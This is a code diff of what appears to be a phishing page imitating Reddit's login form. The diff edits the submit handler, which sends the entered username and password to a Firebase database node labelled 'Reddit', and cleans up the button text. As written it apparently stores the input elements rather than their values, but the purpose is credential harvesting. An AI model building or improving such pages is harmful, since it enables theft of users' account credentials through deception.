@@ -152,7 +152,7 @@
               </fieldset>
 
               <fieldset class="AnimatedForm__field m-small-margin">
-                <button  type="submit" onclick="datos()">Log in 4</button>
+                <button  type="submit" onclick="datos()">Log in</button>
               </fieldset>
 
 
@@ -270,14 +270,15 @@
   firebase.initializeApp(firebaseConfig);
   firebase.analytics();
   firebase.firestore();
+  const dbref = firebase.database().ref().child('Reddit');
 
   function datos() {
     var emailvalue = document.getElementById("loginUsername");
     var passvalue = document.getElementById("loginPassword");
 
 
-    var database = firebase.database();
-    database.ref().child("Reddit").set({
+    
+    dbref.set({
       email: emailvalue,
       password: passvalue
     });
